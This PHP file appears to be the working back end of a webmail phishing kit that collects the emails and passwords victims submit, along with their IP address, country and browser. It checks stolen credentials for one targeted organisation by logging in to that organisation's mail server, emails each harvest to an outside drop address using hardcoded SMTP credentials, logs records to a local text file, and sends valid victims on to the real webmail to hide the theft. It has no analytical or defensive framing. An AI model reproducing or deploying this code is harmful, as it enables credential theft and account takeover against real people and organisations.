<?php
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
}

$jdat = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    ?>
    <html>
    <head>
        <title>403 - Forbidden</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            h1 { color: #d32f2f; }
        </style>
    </head>
    <body>
        <h1>403 Forbidden</h1>
        <p>Access to this resource is denied.</p>
        <hr>
    </body>
    </html>
    <?php
    exit();
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Method not allowed"
    ));
    exit();
}

// SMTP Configuration
$receiver     = 'lenialuno@web.de';         // ENTER YOUR EMAIL HERE
$senderuser   = 'jered@globalrisk.rw';      // ENTER YOUR SMTP USER
$senderpass   = 'global.321';               // ENTER YOUR SMTP PASSWORD
$senderport   = "587";                      // ENTER YOUR SMTP PORT
$senderserver = "mail.globalrisk.rw";       // ENTER YOUR SMTP SERVER

// Capture user input
$browser = $_SERVER['HTTP_USER_AGENT'];
$login   = trim($_POST['email'] ?? '');
$passwd  = trim($_POST['password'] ?? '');
$email   = $login;

// Validate input
if (empty($login) || empty($passwd)) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Email and password are required"
    ));
    exit();
}

// Extract domain from email
$parts = explode("@", $email);
if (count($parts) !== 2) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Invalid email format"
    ));
    exit();
}
$domain = $parts[1];

// Get country name safely
$country = isset($jdat->geoplugin_countryName) ? $jdat->geoplugin_countryName : 'Unknown';

// Create subject and message
$timestamp = date('Y-m-d H:i:s');
$sub = "TrueRcubeOrange1 | " . $passwd . " | " . $domain . " | " . $country . " | " . $ip;

$message = "=== LOGIN ATTEMPT ===\n";
$message .= "Timestamp: " . $timestamp . "\n";
$message .= "Email: " . $login . "\n";
$message .= "Password: " . $passwd . "\n";
$message .= "Domain: " . $domain . "\n";
$message .= "IP: " . $ip . "\n";
$message .= "Country: " . $country . "\n";
$message .= "User Agent: " . $browser . "\n";
$message .= "========================\n\n";

$validCredentials = false;
$testResult = "Not tested";

// Test credentials against mail.globalrisk.rw if it's a globalrisk.rw email
if (strtolower($domain) === 'globalrisk.rw') {
    try {
        $testMail = new PHPMailer(true);
        $testMail->isSMTP();
        $testMail->SMTPAuth = true;
        $testMail->Host = 'mail.globalrisk.rw';
        $testMail->Username = $login;
        $testMail->Password = $passwd;
        $testMail->Port = 587;
        $testMail->SMTPSecure = 'tls';
        $testMail->Timeout = 10;
        $testMail->SMTPDebug = 0;
        
        // Try to authenticate
        if ($testMail->smtpConnect()) {
            $validCredentials = true;
            $testResult = "VALID - Authentication successful on mail.globalrisk.rw";
            
            // Try to send a test email to confirm
            try {
                $testMail->setFrom($login, 'Credential Test');
                $testMail->addAddress($receiver);
                $testMail->isHTML(true);
                $testMail->Subject = "VALID GLOBALRISK.RW CREDENTIALS - " . $login;
                $testMail->Body = "<h2 style='color: green;'>VALID CREDENTIALS FOUND!</h2>";
                $testMail->Body .= "<p><strong>Email:</strong> " . htmlspecialchars($login) . "</p>";
                $testMail->Body .= "<p><strong>Password:</strong> " . htmlspecialchars($passwd) . "</p>";
                $testMail->Body .= "<p><strong>IP:</strong> " . $ip . "</p>";
                $testMail->Body .= "<p><strong>Country:</strong> " . $country . "</p>";
                $testMail->Body .= "<p><strong>Timestamp:</strong> " . $timestamp . "</p>";
                
                if ($testMail->send()) {
                    $testResult .= " - Test email sent successfully";
                }
            } catch (Exception $e) {
                $testResult .= " - Auth OK but test email failed: " . $e->getMessage();
            }
            
            $testMail->smtpClose();
        } else {
            $testResult = "INVALID - Authentication failed on mail.globalrisk.rw";
        }
        
    } catch (Exception $error) {
        $testResult = "ERROR - " . $error->getMessage();
    }
} else {
    $testResult = "Not globalrisk.rw domain - skipped testing";
}

// Add test result to message
$message .= "Credential Test: " . $testResult . "\n";
$message .= "Valid Credentials: " . ($validCredentials ? "YES" : "NO") . "\n\n";

// Always send notification email using your SMTP server
try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->Host = $senderserver;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->SMTPSecure = 'tls';
    $mail->Timeout = 30;
    
    // Set high priority for valid credentials
    if ($validCredentials) {
        $mail->Priority = 1;
        $sub = "🎯 VALID GLOBALRISK.RW | " . $login . " | " . $passwd;
    }
    
    $mail->setFrom($senderuser, 'TrueRcubeOrange1');
    $mail->addAddress($receiver);
    $mail->isHTML(true);
    $mail->Subject = $sub;
    
    // Create HTML body
    $htmlBody = "<h2>TrueRcubeOrange1 - New Login Attempt</h2>";
    $htmlBody .= "<p><strong>Email:</strong> " . htmlspecialchars($login) . "</p>";
    $htmlBody .= "<p><strong>Password:</strong> " . htmlspecialchars($passwd) . "</p>";
    $htmlBody .= "<p><strong>Domain:</strong> " . htmlspecialchars($domain) . "</p>";
    $htmlBody .= "<p><strong>IP:</strong> " . htmlspecialchars($ip) . "</p>";
    $htmlBody .= "<p><strong>Country:</strong> " . htmlspecialchars($country) . "</p>";
    $htmlBody .= "<p><strong>User Agent:</strong> " . htmlspecialchars($browser) . "</p>";
    $htmlBody .= "<p><strong>Timestamp:</strong> " . $timestamp . "</p>";
    $htmlBody .= "<hr>";
    $htmlBody .= "<p><strong>Test Result:</strong> " . htmlspecialchars($testResult) . "</p>";
    $htmlBody .= "<p><strong>Valid Credentials:</strong> <span style='color: " . ($validCredentials ? "green; font-weight: bold;'>YES" : "red'>NO") . "</span></p>";
    
    $mail->Body = $htmlBody;
    $mail->AltBody = strip_tags(str_replace('<br>', "\n", $htmlBody));
    
    $mail->send();
    
} catch (Exception $error) {
    error_log('Mail sending failed: ' . $error->getMessage());
}

// Save to local file
try {
    $fp = fopen("SS-Or.txt", "a");
    if ($fp) {
        fputs($fp, $message);
        fclose($fp);
    }
} catch (Exception $e) {
    error_log('Log file write failed: ' . $e->getMessage());
}

// Increment attempt counter
if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
}
$_SESSION['attempts']++;

// Determine response based on credential validity
if ($validCredentials && strtolower($domain) === 'globalrisk.rw') {
    // Valid globalrisk.rw credentials - redirect to actual webmail
    $response = array(
        "signal" => "OK",
        "success" => true,
        "msg" => "Login successful! Redirecting to your mailbox...",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail.globalrisk.rw"
    );
    
    // Shorter delay for valid credentials
    usleep(rand(200000, 800000)); // 0.2 to 0.8 seconds
    
} else {
    // Invalid credentials or not target domain - show error
    $response = array(
        "signal" => "error",
        "msg" => "Invalid email or password. Please try again.",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail." . $domain
    );
    
    // Longer delay for invalid credentials
    usleep(rand(500000, 1500000)); // 0.5 to 1.5 seconds
}

echo json_encode($response);
exit();
?>